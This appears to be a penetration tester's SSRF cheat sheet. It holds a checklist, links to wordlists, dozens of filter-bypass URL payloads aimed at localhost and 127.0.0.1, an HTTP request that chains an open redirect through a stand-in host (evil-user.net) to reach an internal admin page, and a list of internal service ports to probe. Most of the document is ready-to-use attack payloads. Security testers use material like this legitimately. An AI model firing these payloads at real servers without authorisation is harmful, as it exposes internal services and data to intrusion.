## Wordlist
- [ ] Test SSRF in each parameter with url's
- [ ] Test SSRF in Referer header


#### parameters:
```
https://github.com/ZephrFish/Wordlists/blob/master/SSRF-VarNames-Upper.txt
https://github.com/ZephrFish/Wordlists/blob/master/SSRF-VarNames-Lower.txt
```

#### URL-schemas
```
https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/URL-Schemas.txt

http://
https://
file:///
dict://
ftp://
gopher://
sftp://
ldap://
tftp://
```

#### Payloads
```
https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Blacklist-bypass.txt
https://github.com/0x221b/Wordlists/blob/master/Attacks/SSRF/Whitelist-bypass.txt

http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d={domain}
http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d={domain}
http://{domain}@localhost
http://localhost#{domain}
http://{domain}.localhost
http://localhost/{domain}
http://localhost/?d={domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
http://user@{domain}
http://user#@{domain}
http://user%2523@{domain}
http://localhost:80%2523@{domain}/endpoint

https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d={domain}
https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d={domain}
https://{domain}@localhost
https://localhost#{domain}
https://{domain}.localhost
https://localhost/{domain}
https://localhost/?d={domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}
https://user@{domain}
https://user#@{domain}
https://user%2523@{domain}
https://localhost:80%2523@{domain}/endpoint
```




## Resources
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
https://github.com/assetnote/blind-ssrf-chains
```

It's possible convert bypass while list filter through a Openredirection into a SSRF in some specifics cirscunstances:
```
/product/nextProduct?currentProductId=6&path=http://evil-user.net

# try
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

**Trying identify intranet**
```
http://localhost:7001/console
http://localhost:8080/jmx-console
http://localhost:8080
http://localhost:8090
http://localhost:8888
http://localhost:8983/solr
http://localhost:9200
http://localhost:8500
http://localhost:4242
http://localhost:2375
http://localhost:7979/hystrix
http://localhost:9121/metrics
/psc/
/psp/
```

**Tools**
```
https://github.com/swisskyrepo/SSRFmap

https://www.vaadata.com/blog/exploiting-the-ssrf-vulnerability/
```